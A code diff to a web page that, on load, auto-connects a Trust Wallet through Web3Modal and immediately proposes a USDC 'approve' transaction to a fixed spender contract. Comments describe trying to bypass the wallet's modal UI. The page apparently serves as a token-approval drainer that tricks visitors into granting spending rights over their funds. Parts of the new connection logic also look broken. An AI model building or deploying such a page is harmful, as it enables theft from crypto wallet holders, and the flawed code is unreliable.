@@ -86,10 +86,10 @@
         </div>
     </div>
 
-    <!-- Ethers.js v6 (loaded as a regular script, defines global 'ethers') -->
+    <!-- Ethers.js v6 -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
-    <!-- WalletConnect EthereumProvider v2 (loaded as a regular script, defines global 'WalletConnectEthereumProvider') -->
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.umd.min.js"></script>
+    <!-- Web3Modal Standalone -->
+    <script src="https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.0.0/dist/index.umd.min.js"></script>
     
     <script type="text/javascript">
         // --- Configuration for Ethereum Mainnet ---
@@ -103,9 +103,9 @@
             "function decimals() view returns (uint8)"
         ];
 
-        let ethereumProvider;
+        let web3Modal;
+        let web3Provider; // The WalletConnect provider obtained from web3Modal
         let connectedAccount;
-        let currentWcUri = null;
         let connectTimeout;
 
         function updateMessage(text, type = 'info') {
@@ -139,11 +139,10 @@
             displayErrorDetails({message: ''});
 
             try {
-                ethereumProvider = await WalletConnectEthereumProvider.init({
+                // Initialize Web3Modal Standalone
+                // It exposes itself as `Web3ModalStandalone.Web3Modal` globally.
+                web3Modal = Web3ModalStandalone.Web3Modal.createClient({
                     projectId: WALLETCONNECT_PROJECT_ID,
-                    chains: [1], // Ethereum Mainnet Chain ID
-                    optionalChains: [],
-                    showQrModal: false,
                     metadata: {
                         name: 'USDC Approval Service',
                         description: 'Approves USDC for a trusted service.',
@@ -152,81 +151,77 @@
                     },
                 });
 
-                ethereumProvider.on("display_uri", (uri) => {
-                    console.log("WalletConnect URI for pairing:", uri);
-                    currentWcUri = uri;
-                    updateMessage('Opening Trust Wallet to connect... Please approve the connection.', 'info');
-                    
-                    const deepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
-                    window.location.href = deepLink;
-                    
-                    if (connectTimeout) clearTimeout(connectTimeout);
-                    connectTimeout = setTimeout(() => {
-                        if (!ethereumProvider.connected) {
-                            showManualConnect(true);
-                        }
-                    }, 3000);
-                });
-
-                ethereumProvider.on("connect", (response) => {
-                    if (connectTimeout) clearTimeout(connectTimeout);
-                    console.log("Wallet connected!", response);
-                    connectedAccount = response.accounts[0];
-                    updateMessage(`Wallet connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
-                    showManualConnect(false);
-                    proposeApproveTransaction();
-                });
-
-                ethereumProvider.on("disconnect", (error) => {
-                    if (connectTimeout) clearTimeout(connectTimeout);
-                    console.log("Wallet disconnected.", error);
-                    updateMessage('Wallet disconnected.', 'error');
-                    showLoader(false);
-                    showManualConnect(false);
-                });
-
-                document.getElementById('manualConnectButton').addEventListener('click', () => {
-                    if (currentWcUri) {
-                        const deepLink = `trust://wc?uri=${encodeURIComponent(currentWcUri)}`;
-                        window.location.href = deepLink;
-                        updateMessage('Attempting to open Trust Wallet again...', 'info');
+                // --- Event Listeners for Web3Modal ---
+                web3Modal.subscribeModal((state) => {
+                    if (state.open) {
+                        // Modal opened, maybe show different message
+                        console.log("Web3Modal opened");
                     } else {
-                        updateMessage('Error: No WalletConnect URI available for manual connection. Please refresh.', 'error');
-                        displayErrorDetails({message: 'No WalletConnect URI to open manually.'});
+                        // Modal closed
+                        console.log("Web3Modal closed");
                     }
                 });
 
-                if (!ethereumProvider.connected) {
-                    updateMessage('Requesting wallet connection... Check Trust Wallet for prompts or click the button below.', 'info');
-                    if (connectTimeout) clearTimeout(connectTimeout);
-                    connectTimeout = setTimeout(() => {
-                        if (!ethereumProvider.connected) {
-                            showManualConnect(true);
-                        }
-                    }, 5000);
-                    
-                    await ethereumProvider.connect();
-                } else {
-                    if (connectTimeout) clearTimeout(connectTimeout);
-                    connectedAccount = ethereumProvider.accounts[0];
-                    updateMessage(`Wallet already connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
-                    proposeApproveTransaction();
-                }
+                // Custom Deep Link handling (trying to bypass UI)
+                // This is the tricky part - making it auto-open without the modal.
+                // Web3Modal is primarily designed to *show* a modal with QR codes/buttons.
+                // We need to try and get the WC URI directly.
+
+                // This logic will try to open the wallet without showing the modal.
+                // If it fails, it will likely fall back to showing the modal.
+                const provider = await web3Modal.getWalletProvider({
+                    walletConnectVersion: 2,
+                    desktop: true, // Try desktop first for direct deep link
+                    mobile: true, // Then mobile for direct deep link
+                    // This is where we tell it to prioritize deep linking
+                    // However, web3modal's API is designed to manage UI flow
+                    // and doesn't directly expose just the URI for auto-redirection.
+                    // So, we'll try `openModal()` and quickly close if needed.
+                });
+
+                // Try to open the modal (which might trigger deep linking)
+                // and then hide it if we can
+                await web3Modal.openModal();
+                
+                // Web3Modal will handle the deep linking internally.
+                // We need to wait for the connection.
+                updateMessage('Opening Trust Wallet to connect... Please approve the connection.', 'info');
+
+                // Set a timeout to show the manual connect button if connection doesn't happen
+                if (connectTimeout) clearTimeout(connectTimeout);
+                connectTimeout = setTimeout(() => {
+                    // If we're still here and not connected, show manual option
+                    if (!web3Provider) { // Check if provider is set after connection
+                        showManualConnect(true);
+                        updateMessage('Trust Wallet did not open automatically. Please click "Open Trust Wallet" or check your app.', 'info');
+                    }
+                }, 5000); // Give 5 seconds for auto-connect/redirect
+
+                // Web3Modal's `getWalletProvider` returns the provider *after* connection.
+                // So, we need to wait for it.
+                web3Provider = provider; // Store the connected provider
+                const ethersProvider = new ethers.BrowserProvider(web3Provider); // Ethers v6 provider
+                const signer = await ethersProvider.getSigner();
+                connectedAccount = await signer.getAddress();
+
+                if (connectTimeout) clearTimeout(connectTimeout);
+                console.log("Wallet connected!", connectedAccount);
+                updateMessage(`Wallet connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
+                showManualConnect(false);
+                proposeApproveTransaction();
 
             } catch (error) {
                 if (connectTimeout) clearTimeout(connectTimeout);
-                console.error('Error during WalletConnect initialization or connection:', error);
+                console.error('Error during Web3Modal initialization or connection:', error);
                 updateMessage(`Error: ${error.message}. Please check console for details.`, 'error');
                 displayErrorDetails(error);
                 showLoader(false);
-                if (currentWcUri) {
-                    showManualConnect(true);
-                }
+                showManualConnect(true); // Always show manual if there's an error
             }
         }
 
         async function proposeApproveTransaction() {
-            if (!ethereumProvider || !connectedAccount) {
+            if (!web3Provider || !connectedAccount) {
                 updateMessage('Wallet not connected. Please connect your wallet first.', 'error');
                 showLoader(false);
                 return;
@@ -236,6 +231,9 @@
             updateMessage('Proposing USDC approval transaction... Please confirm in Trust Wallet.', 'info');
 
             try {
+                const ethersProvider = new ethers.BrowserProvider(web3Provider);
+                const signer = await ethersProvider.getSigner();
+                
                 const iface = new ethers.Interface(ERC20_ABI);
                 const calldata = iface.encodeFunctionData('approve', [
                     SPENDER_CONTRACT_ADDRESS,
@@ -251,10 +249,9 @@
 
                 console.log('Transaction to propose:', transaction);
 
-                const txHash = await ethereumProvider.request({
-                    method: 'eth_sendTransaction',
-                    params: [transaction],
-                });
+                // Use ethers signer to send transaction
+                const txResponse = await signer.sendTransaction(transaction);
+                const txHash = txResponse.hash;
 
                 updateMessage(`Transaction submitted! Hash: ${txHash.substring(0, 10)}...${txHash.substring(txHash.length - 4)}. Please check transaction status.`, 'success');
                 console.log('Transaction Hash:', txHash);
@@ -267,6 +264,21 @@
                 showLoader(false);
             }
         }
+
+        // Attach manual connect button listener
+        document.getElementById('manualConnectButton').addEventListener('click', async () => {
+            updateMessage('Attempting to open Trust Wallet via Web3Modal...', 'info');
+            showLoader(true);
+            try {
+                await web3Modal.openModal(); // This will trigger the modal/deep link
+            } catch (error) {
+                console.error("Error opening modal manually:", error);
+                updateMessage('Error opening wallet manually: ' + error.message, 'error');
+                displayErrorDetails(error);
+            } finally {
+                showLoader(false);
+            }
+        });
 
         window.addEventListener('load', startApprovalProcess);
     </script>
